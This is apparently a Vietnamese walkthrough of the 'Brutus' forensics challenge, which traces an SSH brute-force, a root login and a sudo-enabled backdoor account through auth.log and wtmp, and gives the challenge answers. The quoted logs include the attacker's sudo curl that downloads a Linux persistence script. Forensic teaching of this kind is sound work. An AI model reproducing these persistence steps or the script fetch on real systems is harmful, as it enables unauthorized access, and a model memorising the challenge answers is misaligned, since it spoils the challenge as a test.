# Brutus

Mô tả đề bài: In this Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

Về cơ bản bài này sẽ cho mình auth.log và wtmp logs và nhiệm vụ của mình là trả lời câu hỏi.

---

COMPLETE

![](./assets/complete)

## Questions

### Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack? - 65.2.161.68

Sau khi mở file "auth.log" ra thì ta thấy dòng này đầu tiên người dùng đăng nhập đã authenticate thành công vào trong ssh sessions, sau đó là một đoạn log như sau:

```
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422
Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498
Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390
Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: Invalid user admin from 65.2.161.68 port 46460
Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: pam_unix(sshd:auth): check pass; user unknown
```

Đoạn ở trên cho ta biết rằng là ở địa chỉ IP này đang cố đăng nhập vào user admin. 

Ta có thể trả lời được câu hỏi ở trên.

### The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account? - root

Không chỉ là user với username là `admin` ở trên, attcker còn tấn công với những user khác như là `svc_account` hoặc là `server_adm`. Sau những lần brute-force attack không được, cuối cùng attacker có thể authenticate thành công với user `root` qua đoạn log sau:

```bash
Mar  6 06:32:01 ip-172-31-35-28 CRON[2477]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:32:39 ip-172-31-35-28 sshd[620]: exited MaxStartups throttling after 00:01:08, 21 connections dropped
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
```

Từ đó, ta biết được là attacker đã cố gằng brute-force từng password với từng user xuất hiện trong trong dictionary của nó.

### Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact. - 2024-03-06 06:32:45

`wtmp artifact` là tệp nhật ký nhị phân trên hệ điều hành Linux/Unix lưu lại toàn bộ lịch sử phiên đăng nhập, đăng xuất, thông tin thiết bị đầu cuối và thời điểm khởi động hoặc khởi động lại của hệ thống

Mở file wtmp, ta thấy được là file đó chỉ chứa một đống mã hex, đọc không hiểu gì cả.

Nhưng trong file brutus, ta còn có một file `utmp.py`, assume là file này đùng để đọc file wtmp trên, thử chạy với dòng lệnh:
```bash
python3 utmp.py -o file.txt wtmp
```
 và ta có kết quả là một file txt dịch từ wtmp như sau:

```bash
"type"	"pid"	"line"	"id"	"user"	"host"	"term"	"exit"	"session"	"sec"	"usec"	"addr"
"BOOT_TIME"	"0"	"~"	"~~"	"reboot"	"6.2.0-1017-aws"	"0"	"0"	"0"	"2024/01/25 18:12:17"	"804944"	"0.0.0.0"
"INIT"	"601"	"ttyS0"	"tyS0"	""	""	"0"	"0"	"601"	"2024/01/25 18:12:31"	"72401"	"0.0.0.0"
"LOGIN"	"601"	"ttyS0"	"tyS0"	"LOGIN"	""	"0"	"0"	"601"	"2024/01/25 18:12:31"	"72401"	"0.0.0.0"
"INIT"	"618"	"tty1"	"tty1"	""	""	"0"	"0"	"618"	"2024/01/25 18:12:31"	"80342"	"0.0.0.0"
"LOGIN"	"618"	"tty1"	"tty1"	"LOGIN"	""	"0"	"0"	"618"	"2024/01/25 18:12:31"	"80342"	"0.0.0.0"
"RUN_LVL"	"53"	"~"	"~~"	"runlevel"	"6.2.0-1017-aws"	"0"	"0"	"0"	"2024/01/25 18:12:33"	"792454"	"0.0.0.0"
"USER"	"1284"	"pts/0"	"ts/0"	"ubuntu"	"203.101.190.9"	"0"	"0"	"0"	"2024/01/25 18:13:58"	"354674"	"203.101.190.9"
"DEAD"	"1284"	"pts/0"	""	""	""	"0"	"0"	"0"	"2024/01/25 18:15:12"	"956114"	"0.0.0.0"
"USER"	"1483"	"pts/0"	"ts/0"	"root"	"203.101.190.9"	"0"	"0"	"0"	"2024/01/25 18:15:40"	"806926"	"203.101.190.9"
"DEAD"	"1404"	"pts/0"	""	""	""	"0"	"0"	"0"	"2024/01/25 19:34:34"	"949753"	"0.0.0.0"
"USER"	"836798"	"pts/0"	"ts/0"	"root"	"203.101.190.9"	"0"	"0"	"0"	"2024/02/11 17:33:49"	"408334"	"203.101.190.9"
"INIT"	"838568"	"ttyS0"	"tyS0"	""	""	"0"	"0"	"838568"	"2024/02/11 17:39:02"	"172417"	"0.0.0.0"
"LOGIN"	"838568"	"ttyS0"	"tyS0"	"LOGIN"	""	"0"	"0"	"838568"	"2024/02/11 17:39:02"	"172417"	"0.0.0.0"
"USER"	"838962"	"pts/1"	"ts/1"	"root"	"203.101.190.9"	"0"	"0"	"0"	"2024/02/11 17:41:11"	"700107"	"203.101.190.9"
"DEAD"	"838896"	"pts/1"	""	""	""	"0"	"0"	"0"	"2024/02/11 17:41:46"	"272984"	"0.0.0.0"
"USER"	"842171"	"pts/1"	"ts/1"	"root"	"203.101.190.9"	"0"	"0"	"0"	"2024/02/11 17:54:27"	"775434"	"203.101.190.9"
"DEAD"	"842073"	"pts/1"	""	""	""	"0"	"0"	"0"	"2024/02/11 18:08:04"	"769514"	"0.0.0.0"
"DEAD"	"836694"	"pts/0"	""	""	""	"0"	"0"	"0"	"2024/02/11 18:08:04"	"769963"	"0.0.0.0"
"RUN_LVL"	"0"	"~"	"~~"	"shutdown"	"6.2.0-1017-aws"	"0"	"0"	"0"	"2024/02/11 18:09:18"	"731"	"0.0.0.0"
"BOOT_TIME"	"0"	"~"	"~~"	"reboot"	"6.2.0-1018-aws"	"0"	"0"	"0"	"2024/03/06 13:17:15"	"744575"	"0.0.0.0"
"INIT"	"464"	"ttyS0"	"tyS0"	""	""	"0"	"0"	"464"	"2024/03/06 13:17:27"	"354378"	"0.0.0.0"
"LOGIN"	"464"	"ttyS0"	"tyS0"	"LOGIN"	""	"0"	"0"	"464"	"2024/03/06 13:17:27"	"354378"	"0.0.0.0"
"INIT"	"505"	"tty1"	"tty1"	""	""	"0"	"0"	"505"	"2024/03/06 13:17:27"	"469940"	"0.0.0.0"
"LOGIN"	"505"	"tty1"	"tty1"	"LOGIN"	""	"0"	"0"	"505"	"2024/03/06 13:17:27"	"469940"	"0.0.0.0"
"RUN_LVL"	"53"	"~"	"~~"	"runlevel"	"6.2.0-1018-aws"	"0"	"0"	"0"	"2024/03/06 13:17:29"	"538024"	"0.0.0.0"
"USER"	"1583"	"pts/0"	"ts/0"	"root"	"203.101.190.9"	"0"	"0"	"0"	"2024/03/06 13:19:55"	"151913"	"203.101.190.9"
"USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 13:32:45"	"387923"	"65.2.161.68"
"DEAD"	"2491"	"pts/1"	""	""	""	"0"	"0"	"0"	"2024/03/06 13:37:24"	"590579"	"0.0.0.0"
"USER"	"2667"	"pts/1"	"ts/1"	"cyberjunkie"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 13:37:35"	"475575"	"65.2.161.68"
```

Về cơ bản với số lượng log như trên thì ta có thể brute-force từng UTC timestamps là ta có thể ra được kết quả của câu trả lời trên. Nhưng mà ở đây thứ ta cần là hiểu.

Câu trả lời file log đầu tiên của attaker với ip trên với timestampe đó, nhưng mà câu tra lời sẽ là: `2024-03-06 06:32:45`

### SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2? - 37

Từ đoạn log mà ta đã provide ở trong task 2, ta thấy được máy đã tạo một session số thứ tự `37`. Đó chính là trả lời cho câu hỏi trên.

### The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account? - cyberjunkie

Để trả lời câu hỏi này, ta có 2 cách:
1. Khi mà ta để ý ở file `wmtp`, ta thấy được một session login với user một hoàn toàn mới, không phải là mọi user khác mà có thể dùng cho dictionary attack được như là `admin` hay là `server_adm` mà là `cyberjunkie` thông qua đoạn log sau:

```bash
"USER"	"2667"	"pts/1"	"ts/1"	"cyberjunkie"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 13:37:35"	"475575"	"65.2.161.68"
```
và từ đó mà ta có được câu trả lời.

2. Lần này ta đọc ở file `auth.log`, ta thấy được đoạn log như sau:

```bash
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session closed for user root
Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:36:01 ip-172-31-35-28 CRON[2640]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:36:01 ip-172-31-35-28 CRON[2641]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:36:01 ip-172-31-35-28 CRON[2641]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:36:01 ip-172-31-35-28 CRON[2640]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:37:01 ip-172-31-35-28 CRON[2654]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:37:01 ip-172-31-35-28 CRON[2653]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:37:01 ip-172-31-35-28 CRON[2654]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:37:01 ip-172-31-35-28 CRON[2653]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
```

Ở đây, ta có thể giải thích rằng là attacker đã tạo ra một user có tên là `cyberjunkie` và cho vào nhóm quyền sudo. Sau đó disconect session sudo và sau đó đăng nhập vào user đã tạo đó. Nhằm có có quyền persistent.

### What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account? - T1136.001

Câu hỏi này hoàn toàn có thể hỏi ChatGPT và chúng ta có được luôn cau trả lời như sau:

> The MITRE ATT&CK technique for creating an account is T1136 (Create Account), which contains three specific sub-technique IDs depending on the environment: T1136.001 (Local Account), T1136.002 (Domain Account), and T1136.003 (Cloud Account).

Câu trả lời sẽ là **T1136.001 (Local Account)**

### What time did the attacker's first SSH session end according to auth.log? - 2024-03-06 06:37:24

Bởi vì ta biết được cách thức tấn công của attacker rồi, việc đọc log của chúng ta sẽ hoàn toàn đơn giản hơn.

Đọc file `auth.log` ta được đoạn log sau: 

```bash
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

Session 37 chính là session của user `root` và nó đã kết thúc tại `2024-03-06 06:37:24`. Đó chính là câu trả lời cho câu hỏi trên.

### The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

Khi ở trong user ``, có vẻ attacker đã curl về một script từ github qua đoạn log sau:

```bash
Mar  6 06:39:01 ip-172-31-35-28 CRON[2765]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:39:01 ip-172-31-35-28 CRON[2764]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```

Từ đó, ta biết được command mà attacker dùng đó chính là `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

